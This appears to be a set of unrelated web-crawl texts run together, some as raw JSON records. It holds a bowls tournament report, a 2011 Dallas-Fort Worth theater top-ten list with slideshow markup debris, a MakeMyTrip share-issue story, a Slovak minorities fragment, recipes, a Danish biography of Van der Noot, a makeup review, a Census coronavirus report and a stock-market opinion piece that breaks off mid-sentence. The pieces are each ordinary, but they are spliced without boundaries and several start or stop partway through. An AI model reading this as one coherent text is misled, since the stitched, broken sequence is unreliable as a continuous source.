tactics associated with it, the sharks were not troubled by these 'below-the-belt' tactics and made mincemeat of the girls, ending all hopes of retaining their bowls crowns. Clarke & Bayfield found themselves up against Clarke & Clarke next. Based on both round one performances the former looked like favourites, but who could tell how Clarke Jnr would perform when up against the might of his parents? This looked for all the world to be a close contest, and so it came as a big shock to see Team Clarke wipe the floor with a runaway 11-2 victory. The final quarter final saw a return to the green for Stebbings & Shingler as they faced Brian & Christine Luty who, consistent with the luck of old man Luty, had bagged a bye in round one. Mutterings in the crowd suggested that whilst Luty & Luty were fresh off the bench, knowledge of the green could well pay dividends for Stebbings & Shingler, however it was Luty & Luty that got off to a flying start. Ultimately, despite a valiant comeback, Stebbings & Shingler had left themselves too much to do as Luty & Luty advanced to the semi-finals with an 11-5 victory.\nSemi-final one brought together Matthews & Judge and the sharks Lawton & Weston. After two rounds it was clear to all that the sharks were the team to beat, but were Matthews & Judge the ones to spoil the party? A romantic underdog story it might be, but sadly this was one tale that would never reach the back pages as Lawton & Weston showed their prowess in an 11-0 whitewash to take a place in the final. Vying for a place alongside the sharks in the final were two family units; Clarke & Clarke and Luty & Luty. Both had shown promise in the rounds leading up to this match and this really was too close to call. As the light started to fade points were slowly being notched up by both teams, but in what became a reduced duration match Clarke & Clarke just pipped the Luty's to the post with a 7-5 win.\nThe Bowls Final\nSo, to the final. Clarke & Clarke versus Lawton & Weston. Deteriorating weather conditions drove all but the hardiest of spectators into the long room to watch from the sanctity & warmth it provided as the teams took to the green for the final match. As if the pressure of the final wasn't enough, the teams had to contend with playing under floodlights for the first time. No-one was sure how this might affect the green or the mind-set of the players and this only added to the tension that you could almost reach out and touch. Lawton & Weston got off to a flyer, both really showing their league bowling skills, as Clarke & Clarke fought valiantly to keep in the race. Despite picking up the odd point, they really were never in the same league as the sharks who seemed to get better & better as the tournament wore on. In the end Lawton & Weston triumphed 11-3 over Clarke & Clarke who were by no means disgraced by finishing runners-up in the face of some stiff competition throughout.\nAll in all a great day out for everyone involved, with special thanks for Richard Lloyd & Mark Brown for planning the treasure hunt, Tom Hughes for his usual barbequing skills and Andrew Baxter for the use of the Bowls Club and its facilities.\nNext up on the social front, Strictly Come Dancing on Saturday 26 November 2011!

It's not a happy musical, and Michael Serrecchia (who had a terrific year) assembled a first-rate cast and Andy Redmon gave us one of the great set designs of the year. It was Uptown's best use of the Kalita space to date, not to mention their best production there.

John Arnone designed the set and it was the first show of 2011 that used the Wyly space as well as we knew it could be used. The concept of successfully experimenting with the Wyly was followed through in Cabaret, The Wiz and The Tempest (and really started with the fall 2010 production of Henry IV).~!~Brandon Thibodeaux~~~http://www.theaterjones.com/images/large/l_111223235731.jpg~!~6. As You Like It, Trinity Shakespeare Festival at Texas Christian University, Buschmann Theatre, Fort Worth (June): I'm embarrassed that I missed several major Shakespeare productions this year, including Kitchen Dog's Macbeth and all of the Dallas Shakes season (I'm gonna blame the summer heat for part of that). And while Kevin Moriarty's The Tempest as DTC was his finest Shakespeare yet in Dallas, I was most enraptured with Trinity's As You Like It, directed by T.J. Walsh. Interestingly, in all three years of TSF's existence, its productions of the comedies have outshone the tragedies, although there was less consensus about this year, in which some preferred their Macbeth to AYLI. But not me. The comedy and romance was pitch-perfect. What has made TSF rise to the top of the local Shakespeare heap is that they don't overthink concept or waste time with gimmickry. It's about the language, performed by outstanding ensembles of actors who understand the text and motivation. It doesn't hurt that their productions are gorgeous to boot.~!~Amy Peterson~~~http://www.theaterjones.com/images/large/l_111223235819.jpg~!~5. The Shipment, Undermain Theatre, Dallas (June): Undermain had a diverse line-up this year, with a beautifully designed production of Strindberg's Easter and the fantastic performances in Sam Shepard's Ages of the Moon, but I can't stop thinking about The Shipment. In fact, no production of 2011 has had me coming back and analyzing it more than Young Jean Lee's bold look at black stereotypes in entertainment. The fact that it was written by a Korean-American woman, directed by a man of European descent (Stan Wojewodski, Jr.) and attended by a mostly white audience added to the intrigue. It wasn't perfect, and I found myself concerned with the reactions by African-American audience members almost as much as anything on the stage. I was especially taken with Akron Watson's performance as a contemporary, Richard Pryor/Eddie Murphy/Chris Rock-styled comic. I saw it on the final weekend and the performances had probably gelled by then (judging from earlier reviews of it).

Two dynamic performances (by Jeremiah and Gregory \"Rico\" Parker), insightful direction and excellent design concept (set by Michael Pettigrew, sound by David Lanza and lighting by Nikki DeShea Smith) made it the best production of this play I've seen, and the best production of a play at Jubilee I've seen since I started attending there in the late '90s.~!~Buddy Myers~~~http://www.theaterjones.com/images/large/l_111224000107.jpg~!~2.

In this international collaboration with a physical theater in Mexico City (the show was also performed there), the story of a girl adjusting to a new life in the States was filled with symbolism and cultural relevance, and beautifully performed with mask and object-manipulation puppetry that made for some of the most memorable visual images of the year.

I remember talking about how the community has bonded more since the arrival of Kevin Moriarty at the Dallas Theater Center in 2007, but wanted to see more collaboration, especially between our two major cities, Dallas and Fort Worth.\nOf course, the partnerships had already begun by then. It was just a few months after spring's landmark Horton Foote Festival, in which a dozen or so theaters in several cities participated; and there had already been the announcement of a co-production of To Kill a Mockingbird between DTC and Fort Worth's Casa Ma\u00f1ana.\nLooking back at 2011, I realize that I was late in expressing my concern over everyone working together. Because in fact, what made this year so strong was an overwhelming sense of cooperation.\nDTC and Moriarty deserve a big part of the credit, as the Foote festival was headed up by them. In addition to that and the Casa co-pro, there was a signficant joining of forces between them and Dallas Black Dance Theatre for the whirligig production of The Wiz. And by year's end, the city's biggest regional theater would announce another major collaboration for 2012: A production of the chamber opera The Lighthouse, from Dallas Opera and Dallas Theater Center.\nAnd speaking of cross-discipline collabos, the year ended with another major event, A Gathering: The Dallas Arts Community Reflects on 30 Years of AIDS, in which DTC and Dallas Opera joined forces with Turtle Creek Chorale and a number of dance outfits, such as Texas Ballet Theater, Dallas Black Dance Theatre and Bruce Wood Dance Project. The event was put together by Charles Santos of TITAS and the AT&T Performing Arts Center's Chris Heinbaugh, and directed by DTC's Joel Ferrell.\nIt's like everyone is taking the relatively recent game-changing technological innovation of social networking and applying that concept to real life\u2014and by extension, our art. Has North Texas been blanketed with an invisible, massive \"share\" button?\nIn 2011 we also saw a joint concert between the Fort Worth Symphony and the Turtle Creek Chorale; not to mention a collaboration between Dallas Opera, Dallas Children's Theater and the opera departments at Southern Methodist University and the University of North Texas for Doctor Miracle. And Cara M\u00eda Theatre Co. crossed an actual border to create art with Mexico City's Laboratorio de la M\u00e1scara.\nIn addition to the established performance festivals like WaterTower's Out of the Loop Fringe Festival, the Barefoot Brigade Dance Festival and the Festival of Independent Theatres, Uptown Players offered its first Pride Performing Arts Festival and the new Nouveau 47 Theatre gave us an exciting new works festival that brought together actors, playwrights, critics and theatergoers for robust conversation. Additionally, there seemed to be a lot of cross-pollination between the artists of young theaters like N47 and Upstart Productions with Second Thought Theatre and the more established Kitchen Dog and DTC.\nAnd to top it off, Theatre Three marked its 50th anniversary, an achievement you don't earn without having made lots of friends in the community. Jac Alder's organization has long been known for freely sharing resources like props and set pieces.\nWe all seem to be stronger for it. In turn, it was an especially good year for artistic endeavors on local stages. In writing for TheaterJones, the Star-Telegram and Arts+Culture Magazine, I saw 195 productions; probably 85 percent of that theater, with a healthy dose of dance and opera sprinkled in. I'm proud of that fact, because you can't be serious about being an arts writer if you're not devoting major time to getting out there and experiencing it. (My top five Tarrant-centric dance events are in this year-end story in the Star-Telegram.)\nSo, here's the list of my favorite 10 theater productions of 2011, with notes about other shows, performances and events that won't be forgotten anytime soon.\nTo see the list as a slideshow presentation, click the slideshow icon under the photos at the top of this story\n1. Red Light Winter, Second Thought Theatre at the Studio Theatre, Addison Theatre Centre, Addison (April)\nOne of the bigger theater stories of 2011 was how Second Thought Theatre, under new leadership from Chris LaBove and co-founder Steven Walters, bounced back in a big way. All five of their productions this year (two of them at festivals) were excellent, but this staging of Adam Rapp's 2006 Pulitzer Prize finalist, directed by Regan Adair, still resonates the most.

In going back to the theme of collaboration, Garrett will assistant direct the Dallas Theater Center's Next Fall in 2012, working under Moriarty.\n4.

Anyone up for The Scottsboro Boys soon?\nRunner-up: Steven Dietz, whose plays were done at Circle Theatre, WaterTower Theatre, Amphibian Stage Productions and Rover Dramawerks this year.\nBest children's theater production: The True Story of the 3 Little Pigs at Dallas Children's Theater\nBest show performed by children: The Hundred Dresses at Creative Arts Theatre & School\nBest show for children not at a children's theater: Seven in One Blow or the Brave Little Kid, Circle Theatre\nBest university production: The Skriker, Southern Methodist University Meadows School of the Arts\nOutstanding debut production: Oleanna, Dallas Actor's Lab\nBest choreography: Joel Ferrell, Cabaret, Dallas Theater Center\nRunner up: John de los Santos, Spring Awakening, WaterTower Theatre\nFavorite non-theater performing arts experiences of 2011:\nCedar Lake Contemporary Ballet, presented by TITAS at Hamon Hall in the Winspear Opera House\nHydrogen Jukebox, Fort Worth Opera at the Fort Worth Community Arts Center's Betty and Hardy Sanders Theatre\nA Gathering: The Dallas Arts Community Reflects on 30 Years of AIDS at the Winspear Opera House\nFive unforgettable moments at the theater in 2011:\nBruce DuBose shooting, with a shotgun, the finicky ceiling fan in Ages of the Moon at Undermain Theatre.\nThe end of Thomas Riccio's blahblah in the debut production by Dead White Zombies at the Green Zone in the Design District. At the end, as characters set off for a metaphorical Emerald City, the large garage door of the space opens up and we see the real downtown Dallas and perfectly center is the Bank of America skyscraper lit up in shimmering green. They walk out into the night. Utterly magical.\nThere were lots of memorable moments from Ex Voto: The Immaculate Conceptions of Frida Kahlo at the Ochre House, what with the recreation of Kalho's paintings and retablos, the skeleton puppet, original score and scenes in an upright bed. But during a hospital bed scene as the docs are checking out her unborn baby, they crawl down into her womb and we see what happens there through the magic of shadow puppetry.\nIn a quick, last-minute revival of Neil Simon's The Sunshine Boys at the Eisemann Center in Richardson (it also played one night at Casa Manana...more working together!), the former vaudeville brothers were played by Jerry and Dick van Dyke. Local actress Denise Lee held her own as the nurse, and Jerry had the major part. But Dick got the biggest laugh. Upon his entrance, he made a quick swerve around a strategically placed ottoman. Funny on its own in that Dick van Dyke is still as master at physical comedy, but for nostalgia lovers, it was that instant flashback to the opening sequence of The Dick van Dyke Show that made it all worth the ticket price.\nIn Second Thought Theatre's Red Light Winter, Drew Wall's monologue to Natalie Young as his character, Matt, recounts to hers that night in Amsterdam when he hopelessly fell for her. Here's part of it, from a video we filmed after opening night.\nHere's to all of us falling even more in love with local theater in 2012, and to more collaboration.\n\u25ca Editor's note: You can also read thoughts about the year in theater from TJ writers Kris Noteboom, David Novinski and Perry Stewart, here; and more thoughts from TJ media partner CriticalRant, a.k.a Alexandra Bonifield, here. And for the other performing arts, Gregory Sullivan Isaacs' take on the year in classical music is here; Margaret Putnam's Top 10 dance events are here; and Cheryl Callon's take on the year in dance is here.\nIt's all easily findable in our special section 2011 in Review.\nView the Article Slideshow", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 71955}

{"text": "NASDAQ-listed online travel services provider MakeMyTrip Ltd is looking to raise up to $62 million through a fresh public issue of shares while some management executives like founder and CEO Deep Kalra and a few private equity investors, such as Helion Venture and SAIF Partners, are part-selling their stake worth around $109 million (based on last traded market price).\nThis will mean a combined issue worth around $171 million or nearly Rs 770 crore, including the money coming from over-allotment option for as many as 900,000 shares.\nWithin one year, MakeMyTrip will see its market value double with the new issue. The company was valued at around $450 million at the IPO and the post-money valuation, after the proposed issue at the current market price, will be around $930 million \u2013 making it one of the top 250 most valued Indian firms listed on any stock exchange, according to VCCircle estimates.\nIn its prospectus filed with the United States' Securities and Exchange Commission, the firm indicated that the issue could comprise as many as 69 million shares (including over-allotment portion) for a maximum price of $26.22 per share, which may total around $180 million.\nThe Gurgaon-based firm will sell 16 million fresh shares, in addition to the offer for sale by existing shareholders for 44 million shares. The issue to the extent of 6 million shares (not counting over-allotment portion) has been underwritten by Morgan Stanley & Co. International Plc., Deutsche Bank Securities Inc., Pacific Crest Securities LLC and Oppenheimer & Co. Inc. These four are also managing the issue.\nMakeMyTrip intends to use the net proceeds from the offering to expand operations by acquiring or investing in strategic businesses or assets which complement its service and product offerings. It will also invest in technology enhancements, increase working capital and utilise the money for other general corporate purposes. \"At this time, we have not entered into any agreement or commitment with respect to any material acquisition or investment,\" the company said in its disclosure.\nThe firm had announced its plans to raise fresh money (See our earlier report) but did not share details of the selling shareholders.\nMakeMyTrip had floated its IPO last August at a price of $14 per share, raising around $70 million. Of the $70 million offering, about $54 million had been raised through the fresh issue while the rest was secondary sale by investors SAIF Partners, Helion Ventures and Sierra Ventures, besides certain management executives including founder Deep Kalra who part exited.\nHelion is said to have an average cost of purchase of around $5 per share as it co-invested in series B and C rounds of funding. SAIF Partners' cost of purchase is much lower, as it also participated in the first round of funding way back in 2005 when MakeMyTrip was just launching its operations in India. Helion will be making around 5x returns in this second round of part exit while SAIF's returns will be much higher.\nAt the last traded price, Kalra will pocket approximately $12.3 million and, thereby, reduce his holding to 9.43 per cent from 11.3 per cent. At the maiden issue, Kalra had pocketed $5.16 million.\nMeanwhile, SAIF will encash $75 million while Helion will get $17.5 million in the proposed public issue. SAIF will remain the largest shareholder with over 31 per cent stake, valued at $362 million. It had earlier sold shares worth $5.4 million in the IPO.\nSierra Ventures and Tiger Global are among the shareholders who are not selling shares in this round of public issue.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 75617}

Most belong to the largest ethnic group, the Hungarian minority, which totals 520,528 people (or 9.7% of Slovakia's population). The second largest ethnic group is the Roma, with 89,920 Slovak citizens (1.7%) declaring membership in it; however, various surveys and expert estimates put the total number of Roma in Slovakia at between 300,000 and 400,000. Other ethnic minorities are not nearly as numerous: 44,620 (0.8%) Slovak citizens declared Czech ethnicity, 24,201 (0.4%) said they were Ruthenian, 10,814 (0.2%) Ukrainian and 5,405 (0.1%) German. Other declared nationalities included Polish, Jewish, Moravian, Croatian, Serbian, Bulgarian and Russian.\nThere were no significant changes in the status of ethnic minorities in Slovakia in 2005. The incumbent administration once again postponed the adoption of the Act on the Status of Ethnic Minorities and the Act on Financing the Culture of Ethnic Minorities, even though they had been spelled out in its program manifesto and its plan of legislative tasks for 2005. It looks like the government has given up on passing either law before the end of its tenure.\nDespite these partial failures, the fundamental rights of ethnic minorities are respected in Slovakia, and the most serious deformations in minority policy introduced by the Vladim\u00edr Me\u010diar administration were remedied between 1998 and 2002.\nAuthor is a director of the Conservative Institute of M.

{"text": "I was unsure if matcha and peanut butter were supposed to be soulmates, and I set off to make these matcha peanut butter cups anyways. Lucky for all of us, they are a match made in heaven! Easy to make, and magically delicious.\nMix the nut butter filling ingredients well in a bowl. Freeze for 20 minutes.\nKeeping your hands wet (so it doesn't stick as much) roll the nut butter filling into 12 ~2 tsp balls. Freeze for 5 minutes.\nFlatten the nut butter balls into discs. Freeze until step 5.\nIn a double boiler melt the chocolate chips and oil.\nRemove from heat, sift in the matcha powder, and mix well.\nGently add one nut butter disc to each cup.\nTop with ~2 tsp of melted chocolate.\nStore at room temperature or in the refrigerator for 1-2 weeks\u2026if they last that long.\nThe most important parts of this recipe are the following: make sure your peanut butter is very cold & make sure your hands are wet. If you do these two things, then you will sail through the rest of the recipe without a mess. Also, do not melt your chocolate in advance. If you do, you will end up with hardened chunks that make it difficult to use.\nWhat kind of matcha do you use for baking?\nThis recipe works great with culinary grade matcha. Please do not splurge on the ceremonial grade matcha when baking, or even in your lattes. Save the ceremonial grade matcha for traditional matcha, and use culinary grade matcha for all your baking needs.\nAllergic to peanuts? Make them nut butter cups!\nUse any of your favorite nut butters. However, I have found that the nut butters containing seeds like chia and flax do not add a pleasant texture to these nut butter cups. Also, I used chunky peanut butter, but smooth works great, too.\nLooking for regular peanut butter cups?\nHere's my recipe for dark chocolate nut butter cups. Also delicious, and fun to make.\nDoes white chocolate have dairy?\nYES. However, if you need dairy-free white chocolate, make sure you are checking the ingredients. Dairy free white chocolate does exist, and this one is my favorite. Also, just in case I wasn't clear about it, this recipe definitely works with dairy-free white chocolate.\nMake these for Valentine's Day with your love\u2026its easy, but a little messy, and the chocolatey mess is perfect for a day like Valentine's Day. Also, they're a treat you can enjoy the next day and all week long!\nMORE MATCHA other than these Matcha Peanut Butter Cups!\nI earn from qualifying Mizuba Tea Co. purchases.

{"text": "Hendrik Karel Nicolaas van der Noot (7. januar 1731 i Brussels \u2013 12. januar 1827 i Strombeek) var en jurisk, advokat og politiker fra Brabant. Han var en af hovedm\u00e6ndene i den brabantiske revolution (1789\u20131790) mod kejser Josef 2. og hans \u00f8strigske styre. Denne revolution f\u00f8rte til de kortlivede Belgiens forenede Stater (11. januar 1790 \u2013 december 1790).\n\nTo advokater Jan Frans Vonck og Hendrik Van der Noot var lederne i revolten, men de repr\u00e6senterede hver sin fraktion. Vonckisterne var inspireret af den franske revolution (1789\u20131799) og fors\u00f8gte at skabe forbindelse mellem folket og revolutionsh\u00e6ren. De Statists anf\u00f8rt af Van der Noot str\u00e6bte efter at adelens og kirkens gamle privilegier skulle genoplives s\u00e5som \"Blijde Inkomst\" og s\u00f8gte samarbejde med de Forenede Nederlande.\n\nI mods\u00e6tning til Vonck, som mente at det belgiske folk selv m\u00e5tte k\u00e6mpe mod den \u00f8strigske despot, havde Van der Noot st\u00f8rre tiltro til fremmed st\u00f8tte. I 1788 rejste Van der Noot til England,  de Forenede Nederlande og Preussen for at f\u00e5 sat lys p\u00e5 sp\u00f8rgsm\u00e5let om frihed for Brabant. Kun Preussen, som selv havde sl\u00e5et de hollandske opr\u00f8rere i 1787 var interesseret i at st\u00f8tte de belgiske opr\u00f8rere, da de p\u00e5 dav\u00e6rende tidspunkt var imod \u00d8strig. Van der Noot havde havde mindre held med at f\u00e5 st\u00f8tte fra den sidste Raadspensionaris i Holland, Laurens Pieter van de Spiegel.\n\nI oktober 1789 erobrede Van der Noot og general Vander Meersch hele provinsen Brabant med en lille opr\u00f8rsh\u00e6r fra Breda. I den f\u00f8rst erobrede by, Hoogstraten, udsendte Van der Noot sit manifest til folket i Brabant den 24. oktober 1789. Manifestet forklarer hvorfor folket i Brabant har ret til at n\u00e6gte at adlyde en hersker. Hovedargumentet er, at nationens vilje er den h\u00f8jeste lov, og at hvis den kr\u00e6nkes af en hersker har nationen ret til at g\u00f8re opr\u00f8r mod herskeren.  \n\nVan der Noot erobrede Turnhout ved at besejre \u00f8strigerne i slaget ved Turnhout den 28. oktober og Ghent blev erobret den 13. november. Den 17. november flygtede de kejserlige regenter Albert af Sachsen og \u00e6rkehertuginde Maria Christina fra Bruxelles. Resterne af de kejserlige styrker trak sig tilbage til citadellerne i Luxembourg og Antwerpen.\n\nVan der Noot erkl\u00e6rede Brabant for uafh\u00e6ngigt, og alle andre provinser i de \u00d8strigske Nederlande fulgte snart efter undtagen Luxembourg. Den 11. januar 1790 underskrev de en pagt hvorved der blev dannet en konf\u00f8deration under ledelse af Van der Noot. Den fik navnet Verenigde Nederlandse Staten / \u00c9tats-Belgiques-Unis (Belgiens forenede Stater). \n\nDa Preussen stoppede st\u00f8tten til revolten efter at have underskrevet Reichenbachkonventionen (27. juli 1790) med \u00d8strig kom den skr\u00f8belige stat snart under angreb fra \u00f8strigske tropper under kejser  Leopold 2. I november 1790 m\u00e5tte Van der Noot flygte til Holland og derefter til England. I 1792 udsendte han en appel om samarbejde med de franske bes\u00e6ttere (1794\u20131815). Han vendte tilbage til Brabant, men blev arresteret i 1796 og sad i f\u00e6ngsel i  's-Hertogenbosch.\n\nEksterne kilder \n Manuscript af Van der Noot om hans f\u00e6ngselsophold i 1796 \n\nPolitikere fra Belgien\nJurister fra Belgien\nPersoner fra Bruxelles", "meta": {"redpajama_set_name": "RedPajamaWikipedia"}, "__index_level_0__": 41212}
{"text": "I am a breakfast person. And as far as I know, I do not believe there is something trendier than pancakes for breakfast. Even though some other breakfast ideas do attract the spotlights, such as chia puddings, healthy granolas or smoothies, I've never seen so many pancakes on my Instagram feed or on the Internet. And the reason is we, food bloggers, are creating healthy versions of them, which do attract people's attention more and more every day. I've been asked multiple times to share a pancake recipe on the blog, and I guess those people's dreams have come true! (For a non-vegan recipe, you can click here !).\nThere is nothing else you would want to wake up to; there is nothing else you would want to pour maple syrup on; there is nothing else you could sacrifice your sanity for. Well, let's be honest, if you have got someone to prepare them for you, that's even better. Waking up to those beauties is like discovering a hundred banknote in the side pocket of your favourite jeans. Not only are they fluffy as cotton clouds, but they are sweet and perfectly balanced at the same time, firm and yet very tender. What you could do if you're running out of time in the morning is preparing them ahead (do not prepare the dough ahead, as it will become way to dense the day after) and simply grab them in the morning.\nI am doing doing all that fuss about breakfast because it actually is the most important meal of the day. Not only is it the time where your body needs to refuel, as it's been starving and using some energy through the night (because your brain stays active during the night, and even if you're sleep, it is your entire body which regenerates. And to do that, it uses the rest of power and energy you've gather throughout the previous day). To give proper energy to your muscles, cells and entire organism, you need to have a proper breakfast. A good balance of carbohydrates, fats and proteins, to offer your body all the chances it gets to crush its day! It is in the morning that we create our energy and intention for the day. Changing habits takes time indeed, but when it comes to the body functions, it is even simpler. If you're not hungry in the morning, start eating even if not hungry or waking up earlier (so that your digestive system wakes up too), and slowly but surely, your body will adapt to this new rhythm; you'll just need to deeply want it. Keep that in mind folks!\n1) Start by blending the oats until obtaining a very fine flour consistency. Add the buckwheat flour, cinnamon, baking soda and psyllium to the food processor or blender and blend just for a few seconds to mix.\n2) In a large mixing bowl, mash the banana, and add the milk and maple syrup. Pour the dry ingredients in and mix correctly. The dough must be shiny and runny (but not too much).\n3) Add 1 tablespoon of coconut oil to a frying pan, and turn on medium heat. Spoon out some dough (one heaped tablespoon each) and form two to three pancakes at the same time. Cook for about 2 minutes on this side, or until bubbles start appearing at the top. Flip them all and cook for one more minutes. Place them on a plate, heat some more oil and start again, until you're out of dough.\n4) Serve immediately, with the toppings of your choice. I personally love some more maple, a few frozen or fresh berries, some nut butter & a few seeds on top. Enjoy!", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 50579}
{"text": "If you are looking to make your makeup last all day, reduce shine, and create an airbrushed finish, then you need to make sure you are using a setting powders. Setting powders are made to lock in your look so you stay flawless all day.\nI personally use my setting powders for my liquid foundations and concealers. I also think it is wise to have a setting powder that you use for your face and another that you use specifically for baking your under eye concealer. Using different kinds helps you to achieve a different finish for parts of your face that may have different needs.\nIf you have never heard of baking, or have never tried it, essentially what it is is packing on a loose powder with a damp sponge, to areas such as the under eye. After packing on this powder you need to leave it set for 5 to 10 minutes as that helps the powder to mesh with the liquid product to lock it in all day. The heat from your face essentially \"cooks\" the two together which is where the term \"bake\" comes from.\nThe following is my list of top setting powders that are used either for setting or baking your makeup.\nThe RCMA No Color Powder is definitely a product that YouTube made me buy. I saw so many gurus using this and the finish was always fabulous. This is a product I use specifically for baking, as it creates an airbrush finish under the eyes without looking dry or leaving flashback.\nThe number one thing that I love about this product is the amount of powder that you get in a bottle and the price. I purchased mine from Beautylish and it cost me $12 for 3 oz. of product. That is huge for a setting powder as most only give you 1 oz. for triple the price.\nThe only downside to this product is that the bottle it comes in is not very user friendly. I actually poured some of this in to an old NYX setting powder container that was empty so I can get easier use out of this. This product is such a staple and it will last you forever!\nIt is my personal opinion that the Dermablend Loose Setting Powder is totally overlooked when it comes to people's favorite powders. This powder from Dermablend is one of the most finely milled powders that I have ever come across and it is one of the best.\nThis is also a powder that I use solely for baking. I have the color \"Colorless,\" but it does come in two other shades; Cool Beige and Warm Saffron if colorless isn't your style. This product works to absorb excess oils and creams to better cover your imperfections, but it never looks dry or cakey. I have accidentally left this powder on for much longer than I needed to and it still came out perfect.\nThis powder is definitely on the pricier end of the spectrum, at $27 for 1 oz., but it has lasted me forever and I use it on a daily basis to bake. It even works well when mixed with my RCMA.\nThis powder right here is my all time favorite loose powder to set my face. It is the most beautiful setting powder that you will ever stumble upon. This is most likely the powder that I will be using to set my face with until I'm dead.\nThe product that I am talking about is the Lancome Absolue Radiant Smoothing Powder. This powder will completely erase any trace of pores that you have and leave you looking the most radiant that you ever will be. The powder contains soft-focus micro sparkles and Color Clarity Technology to blur pores and fine lines, while also reducing dryness.\nI feel like this product adjusts to the needs of my skin. So some days if I have some acne or my pores are larger, it seems to go the extra mile to diminish the appearance of those. Or if I am dry it seems more radiant and does not cling to dry patches. It really is a miracle product. Also, this powder comes in six different shades, so you are guaranteed to find one that makes you look your absolute best.\nNow on to the only downside of this product, the price tag. This product costs $58 for 0.352 oz. of powder. Now hear me out before you die of shock. I have had this powder for a year now and have hardly made a dent in to it. I also use this powder on a daily basis. As you need so little of it to create a flawless base, this will literally last you forever. I am thinking it's going to take me another year or so to even get through it. Definitely an investment worth making that 110% has my approval.\nIf you are not a fan of radiance in a powder or have pretty oily skin, I would definitely recommend that you check out the Urban Decay Naked Skin Ultra Definition Loose Finishing Powders for a poreless, matte finish. I think out of all of the powders mentioned this is the most finely milled powder.\nIt is incredibly silky and weightless, so you hardly even know you have a powder on. Due to the silkiness your skin will feel so velvety and smooth, which translates to an airbrushed look. It sets your look in place all day and minimizes any shine that you may have. Urban Decay does offer this powder in three shades: Light, Medium, and Dark. The colors will not alter the look of your foundation too much so the three shades do work for most skin tones.\nThe price of this powder falls somewhere right in the middle of all of these choices. You will get 0.28 oz. of product for $34. Again, this powder will last you a long time, so you will get plenty of uses out of just one jar.\nHave you tried any of these powders? What are your favorite to set/bake with?", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 40280}
{"text": "As the Census halts field operations due to the coronavirus, Lehigh Valley organizers must pivot strategy\nBy Kayla Dwyer\nOn March 12, the U.S. Census Bureau put millions of invitations in the mail for households to respond to the decennial population count. That same day, the Lehigh Valley confirmed its first case of the coronavirus.\nSince then, schools closed, sports leagues suspended seasons, nonessential businesses in Pennsylvania shuttered. And last week, the Census Bureau announced all in-person field operations are suspended through at least April 1.\n\"Of all of our worst nightmares, of things that could go wrong with the census, we did not anticipate this set of actions,\" Albert Fontenot, associate director for decennial programs, said on a Friday news conference call.\nIn the Lehigh Valley and everywhere, officials are rethinking their outreach strategy to make sure everyone gets counted for the once-a-decade census whose deadline, as mandated by Congress, is still Dec. 31.\nOther deadlines have been pushed back in light of the coronavirus, officials said Friday. Though 600,000 people accepted jobs as temporary census workers, their onboarding process is halted for two weeks until April 1. That means a two-week delay in the start of the nonresponse follow-up operations (from May 13 to May 28) and the deadline to complete that data collection (from July 31 to Aug. 14).\nThese 600,000 workers make up almost all of the jobs needed for the 2020 census, said Timothy Olson, associate director for field operations. But the bureau still wants people to apply, acknowledging that it will likely need to hire more people than planned as some drop out due to concerns over the coronavirus.\n\"There could be a greater loss of individuals out of fear,\" he said. \"We will be overhiring when we resume to accommodate for a greater expected attrition.\"\nThe constitutionally mandated census and the coronavirus collide in more ways than logistically. Much of the Valley's most undercounted population \u2014 the elderly, the poor \u2014 are also at the highest risk for severe ramifications of COVID-19.\nLehigh Valley census committees and nonprofits had a coordinated strategy to reach those undercounted populations that involved canvassing work; visits to age-restricted housing, colleges and schools; census \"hubs\" set up at city nonprofits; and more, financed by $65,000 in grants funneled through the Lehigh Valley Community Foundation.\nKevin Greene, chief operating officer at Faces International, an Allentown marketing agency that is directing the digital aspects of the regional campaign, said about 70% of the strategy consisted of in-person community engagement and census hubs.\n\"We had a nice really robust strategy that was very effective, and then this hit,\" he said.\nThe foundation, in conjunction with the Lehigh and Northampton County Complete Count committees, last week received a $25,000 grant from the state for census outreach. Now they have to modify their proposal.\nFaces International will transition completely to a digital strategy, moving beyond social media advertising and onto platforms such as YouTube. The adjusted message will ask residents to reach out to people they know who may not have internet. Officials have been steering people to fill out the questionnaire online.\n\"That's our best avenue that we have,\" Greene said. \"It really is going to be the community coming together.\"\nThe community foundation will put more money toward bilingual radio, television and bus advertisements, communications director Michael Wilson said. Last week, the foundation sent out letters to grantees \u2014 nonprofits such as Casa Guadeloupe in Allentown and the Hispanic Center in Bethlehem \u2014 providing advice on how to change their strategies.\nBut it was also a message of understanding, as the agencies deal with their own ramifications of serving people amid the coronavirus.\n\"We were really concerned with the nonprofit sector and the impact on their capacity to deliver their services, let alone do these over-and-above activities like helping to promote the census,\" he said.\nSo regional partners are thinking about strategies to take some of the load, like phone banking and texting campaigns.\nThe only saving grace is that the census can be done online this year, Wilson said.\nOlson said census workers are making contact with 335,000 partner organizations around the country to help them recraft their campaigns and communicate critical information, such as the fact that college students, even though most have been sent away from campus, are still to be counted in their college town.\nGoing forward, all temporary workers will be trained virtually, Olson said. As of Friday morning, 2.8 million people applied for temporary census jobs, and 18.6 million households have responded to the questionnaire.\nPennsylvania is slightly ahead of the national curve in terms of self-response to the census, according to numbers released over the weekend. So far, 20.4% of Pennsylvanians responded online, by mail or by phone, compared with 19.2% nationally. In Lehigh County, 20.8% responded, and in Northampton, 21.1%, according to the Census Bureau.\nMorning Call reporter Kayla Dwyer can be reached at 610-820-6554 or at kdwyer@mcall.com.", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 67179}

{"text": "In the shorter term, I'm quite bullish on U.S. markets. That's because President Trump is tying his success as a president \u2014 and his case for a second term \u2014 to the success of the stock market.\nNow, there are fundamental reasons to be bullish on stocks. We should get a trade deal with China eventually. Economic growth, while not great, is pretty good. And S&P 500 companies repurchased $223 billion of their own shares in the fourth quarter, up 63% from a year earlier. As companies gobble up their own stock, it improves per-share earnings.\nThese are all good reasons to be bullish. Importantly, I believe President Trump \"trumps\" any fundamentals that might otherwise turn bearish.\nBoth CNBC and Bloomberg report that President Trump is pushing hard for a trade deal with China as a fresh catalyst for the markets. He's keen to use any means available to extend a stock market run-up that could become a record-setter.\nThis is why President Trump was such a vocal critic of the Federal Reserve's rate-hike policy last year. And that's why, in December, the Fed changed course and became extremely dovish. The Fed canceled the series of rate increases the Federal Open Market Committee previously planned for 2019. And it acknowledged that changes in markets and financial conditions would affect its actions going forward.\nMore recently, we have Larry Kudlow, 